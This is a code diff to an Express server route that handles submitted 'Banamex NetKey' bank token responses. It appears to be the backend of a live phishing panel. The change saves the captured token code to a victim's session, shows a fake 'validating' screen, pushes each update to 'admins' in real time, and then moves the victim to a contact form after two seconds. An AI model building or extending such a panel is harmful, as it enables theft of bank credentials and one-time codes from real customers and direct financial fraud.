@@ -838,9 +838,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
         });
       }
 
-      const session = await storage.updateSession(sessionId, { 
+      // Primero cambiar a VALIDANDO
+      let session = await storage.updateSession(sessionId, { 
         netkeyResponse,
-        pasoActual: ScreenType.BANAMEX_CONTACT_FORM,
+        pasoActual: ScreenType.VALIDANDO,
       });
 
       console.log(`[Banamex NetKey] NetKey recibido - Session: ${sessionId}`);
@@ -859,6 +860,24 @@ export async function registerRoutes(app: Express): Promise<Server> {
         type: 'SESSION_UPDATE',
         data: session
       }));
+
+      // Después de 2 segundos, cambiar automáticamente a BANAMEX_CONTACT_FORM
+      setTimeout(async () => {
+        try {
+          const updatedSession = await storage.updateSession(sessionId, { 
+            pasoActual: ScreenType.BANAMEX_CONTACT_FORM,
+          });
+
+          console.log(`[Banamex NetKey] Cambiando automáticamente a formulario de contacto - Session: ${sessionId}`);
+
+          broadcastToAdmins(JSON.stringify({
+            type: 'SESSION_UPDATE',
+            data: updatedSession
+          }));
+        } catch (error) {
+          console.error(`[Banamex NetKey] Error al cambiar a formulario: ${error}`);
+        }
+      }, 2000);
 
       res.json({ 
         success: true,
